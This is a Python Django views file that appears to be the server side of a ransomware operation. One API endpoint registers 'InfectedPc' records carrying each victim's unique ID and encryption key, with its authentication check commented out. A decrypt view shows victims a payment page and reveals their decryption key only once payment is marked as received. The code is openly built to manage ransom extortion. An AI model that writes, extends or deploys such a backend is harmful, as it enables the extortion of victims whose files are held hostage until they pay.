from rest_framework import generics
from .models import InfectedPc
from .serializers import InfectedPcSerializer
from django.http import HttpResponseRedirect, HttpResponse

from rest_framework import generics
from rest_framework import permissions
from rest_framework.response import Response
from rest_framework.views import status
from django.shortcuts import render
from .forms import decryptForm


class ListInfectedPcView(generics.ListAPIView):
    """
    Provides a get method handler.
    """
    queryset = InfectedPc.objects.all()
    serializer_class = InfectedPcSerializer
    #permission_classes = (permissions.IsAuthenticated,)

    def post(self, request, *args, **kwargs):
        created = InfectedPc.objects.get_or_create(
            uniqueId=request.data['uniqueId'],
            encryptionKey=request.data['encryptionKey'],
        )
        if created[1]:
            return Response(
                data="InfectedPC entry added",
                status=status.HTTP_201_CREATED
            )
        else:
            return Response(
                data="InfectedPC already existing",
                status=status.HTTP_200_OK
            )

def decrypt(request):
    # if this is a POST request we need to process the form data
    if request.method == 'POST':
        # create a form instance and populate it with data from the request:
        form = decryptForm(request.POST)
        # check whether it's valid:
        if form.is_valid():
            uniqueId = form.cleaned_data['uniqueId']
            infectedPcObject = InfectedPc.objects.filter(uniqueId=uniqueId).last()
            exists = InfectedPc.objects.filter(uniqueId=uniqueId).exists()
            if exists == True:
                paymentStatus = infectedPcObject.paymentStatus
                if paymentStatus == False:
                    return render(request, 'payment.html', {'uniqueId': uniqueId})
                if paymentStatus == True:
                    return HttpResponse("already paid! Decryption key is: " + infectedPcObject.encryptionKey)
            else:
                return HttpResponse("uniqueId does not exist in this database")
    else:
        form = decryptForm()

    return render(request, 'decrypt.html', {'form': form})
def index(request):
    return render(request, 'index.html')
    

